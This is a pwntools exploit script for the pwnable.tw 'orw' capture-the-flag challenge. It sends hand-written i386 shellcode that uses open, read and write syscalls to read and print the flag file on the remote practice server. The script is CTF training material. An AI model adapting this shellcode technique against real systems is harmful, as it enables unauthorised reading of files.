#!/home/thomason/.virtualenv/pwnshop/bin/python

from pwn import *


context.arch = "i386"
context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]
# context.terminal = ["tmux", "neww"]

r = lambda x: p.recv(x)
ra = lambda: p.recvall()
rl = lambda: p.recvline(keepends=True)
ru = lambda x: p.recvuntil(x, drop=True)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
sla = lambda x, y: p.sendlineafter(x, y)

HOST = "chall.pwnable.tw"
PORT = 10001
LOCAL = False
elf = ELF("./orw")
libc = elf.libc

if LOCAL:
    # p = elf.process()
    # gdb.attach(p, """
    #         b main
    #         c
    #         """)
    p = gdb.debug(elf.file.name, """
            b *0x0804858a
            c
            si
            """)
else:
    context.log_level = "info"
    p = remote(HOST, PORT)

# Exploit starts here
shellcode = """
mov eax, 5
mov ebx, 0x0804A0A0
xor ecx, ecx
int 0x80

mov ebx, eax
mov eax, 3
mov ecx, 0x0804A110
mov edx, 500
int 0x80

mov eax, 4
mov ebx, 1
mov ecx, 0x0804A110
mov edx, 500
int 0x80
"""
payload = asm(shellcode).ljust(0x40, b'\x00') + b"/home/orw/flag\x00"
sla(':', payload)

p.interactive()

